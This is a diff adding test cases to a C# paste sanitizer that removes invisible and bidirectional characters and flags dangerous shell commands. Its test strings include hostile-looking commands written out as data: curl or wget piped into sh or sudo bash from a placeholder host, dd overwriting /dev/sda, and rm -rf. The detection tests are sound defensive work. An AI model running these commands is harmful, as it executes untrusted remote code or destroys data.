@@ -74,6 +74,7 @@ internal static class Program
         Equal(PasteSanitizer.RemoveControlCharacters("a\u009b31mb"), "ab", "the 8-bit CSI is removed");
         Equal(PasteSanitizer.RemoveControlCharacters("a\u0085b\u009fc"), "abc", "C1 controls are removed");
         Equal(PasteSanitizer.RemoveControlCharacters("a\u200bb\u202ec\u2066d\ufeffe"), "abcde", "zero-width and bidirectional characters are removed");
+        Equal(PasteSanitizer.RemoveControlCharacters("\u0645\u0646\u200c\u0645\u06cc\u200d\ud83d\udc68\u200d\ud83d\udc69"), "\u0645\u0646\u200c\u0645\u06cc\u200d\ud83d\udc68\u200d\ud83d\udc69", "ZWNJ and ZWJ (Persian, emoji sequences) stay");
         Equal(PasteSanitizer.RemoveControlCharacters("\u041f\u0440\u0438\u0432\u0435\u0442 \u4e16\u754c"), "\u041f\u0440\u0438\u0432\u0435\u0442 \u4e16\u754c", "letters of other scripts stay");
         Check(PasteSanitizer.HasControlCharacters("a" + Esc + "[0mb"), "escape sequences are detected");
         Check(PasteSanitizer.HasControlCharacters("a\u202eb"), "a bidirectional override is detected");
@@ -102,6 +103,13 @@ internal static class Program
         Check(Dangerous("bash <(curl -s https://x.example/i.sh)\n", "curl"), "bash <(curl ...)");
         Check(Dangerous("eval \"$(curl -s https://x.example/i.sh)\"\n", "curl"), "eval of curl output");
         Check(!Dangerous("curl -o file.txt https://x.example/f\n", "curl"), "a plain download is fine");
+        // The usual way an install instruction is written: wrapped, the pipe on the next line.
+        Check(Dangerous("curl -fsSL https://x.example/i.sh \\\n  | sh\n", "curl"), "curl piped into sh on the next line (backslash)");
+        Check(Dangerous("curl -fsSL https://x.example/i.sh |\n  sh\n", "curl"), "curl piped into sh, the pipe ends the line");
+        Check(Dangerous("wget -qO- https://x.example/i.sh \\\n  | sudo \\\n  bash\n", "curl"), "wget piped into sudo bash over three lines");
+        Check(Dangerous("dd if=/dev/zero \\\n  of=/dev/sda\n", "disk"), "dd to a device, of= on the next line");
+        Check(!Dangerous("curl -o file.txt \\\n  https://x.example/f\n", "curl"), "a plain download in two lines is fine");
+        Check(!Dangerous("curl -s https://x.example/i.sh \\ \n  | sh\n", "disk"), "a backslash followed by a blank is no continuation");
         Check(Dangerous("rm -rf /tmp/x\n", "rm -rf"), "rm -rf");
         Check(Dangerous("rm -fr x\n", "rm -rf"), "rm -fr");
         Check(Dangerous("/bin/rm -r x\n", "rm -rf"), "rm -r with a path");
